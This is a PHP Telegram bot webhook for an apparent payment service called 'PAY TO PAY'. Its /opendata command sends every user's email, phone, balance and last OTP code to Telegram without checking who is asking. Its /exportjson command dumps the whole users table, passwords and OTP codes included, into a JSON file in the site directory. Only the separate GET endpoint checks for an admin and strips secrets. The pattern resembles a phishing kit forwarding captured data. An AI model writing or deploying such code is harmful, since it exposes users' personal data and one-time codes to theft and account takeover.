<?php
require_once 'config/database.php';
require_once 'config/telegram.php';

// Get Telegram update
$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['message'])) {
    $chat_id = $update['message']['chat']['id'];
    $text = $update['message']['text'];
    $username = $update['message']['from']['username'] ?? 'Unknown';
    
    // Admin commands
    if ($text == '/opendata') {
        // Get all users data
        $sql = "SELECT * FROM users ORDER BY registration_date DESC";
        $result = mysqli_query($conn, $sql);
        
        $message = "📊 <b>PAY TO PAY - ALL USER DATA</b>\n\n";
        $message .= "Total Users: " . mysqli_num_rows($result) . "\n\n";
        
        while($user = mysqli_fetch_assoc($result)) {
            $message .= "━━━━━━━━━━━━━━━━\n";
            $message .= "👤 <b>Username:</b> " . htmlspecialchars($user['username']) . "\n";
            $message .= "📧 <b>Email:</b> " . ($user['email'] ?: 'N/A') . "\n";
            $message .= "📱 <b>Phone:</b> " . ($user['phone'] ?: 'N/A') . "\n";
            $message .= "🔐 <b>Status:</b> " . ($user['is_verified'] ? '✅ Verified' : '❌ Unverified') . "\n";
            $message .= "💰 <b>Balance:</b> Rp " . number_format($user['balance'], 2) . "\n";
            $message .= "📅 <b>Registered:</b> " . date('d/m/Y H:i', strtotime($user['registration_date'])) . "\n";
            $message .= "⏰ <b>Last OTP:</b> " . ($user['otp_code'] ?: 'N/A') . "\n";
            $message .= "━━━━━━━━━━━━━━━━\n\n";
        }
        
        // Send to Telegram (split if too long)
        $chunks = str_split($message, 4000);
        foreach ($chunks as $chunk) {
            sendTelegramMessage($chunk);
        }
    }
    
    // Export data to JSON
    if ($text == '/exportjson') {
        $sql = "SELECT * FROM users ORDER BY registration_date DESC";
        $result = mysqli_query($conn, $sql);
        $users = [];
        
        while($user = mysqli_fetch_assoc($result)) {
            $users[] = $user;
        }
        
        $json_data = json_encode($users, JSON_PRETTY_PRINT);
        file_put_contents('data_users.json', $json_data);
        
        sendTelegramMessage("✅ Data exported to data_users.json\nTotal users: " . count($users));
    }
    
    // Help command
    if ($text == '/help' || $text == '/start') {
        $help_message = "🤖 <b>PAY TO PAY BOT COMMANDS</b>\n\n";
        $help_message .= "/opendata - View all user data\n";
        $help_message .= "/exportjson - Export data to JSON\n";
        $help_message .= "/help - Show this help message\n\n";
        $help_message .= "🔒 <i>Admin only commands</i>";
        
        sendTelegramMessage($help_message);
    }
}

// Also create a JSON file endpoint
if (isset($_GET['getdata']) && $_GET['getdata'] == 'json') {
    requireLogin();
    
    if ($_SESSION['is_admin']) {
        $sql = "SELECT * FROM users ORDER BY registration_date DESC";
        $result = mysqli_query($conn, $sql);
        $users = [];
        
        while($user = mysqli_fetch_assoc($result)) {
            // Remove sensitive data
            unset($user['password']);
            unset($user['otp_code']);
            $users[] = $user;
        }
        
        header('Content-Type: application/json');
        echo json_encode($users, JSON_PRETTY_PRINT);
    } else {
        header('HTTP/1.0 403 Forbidden');
        echo 'Access denied';
    }
    exit();
}
?>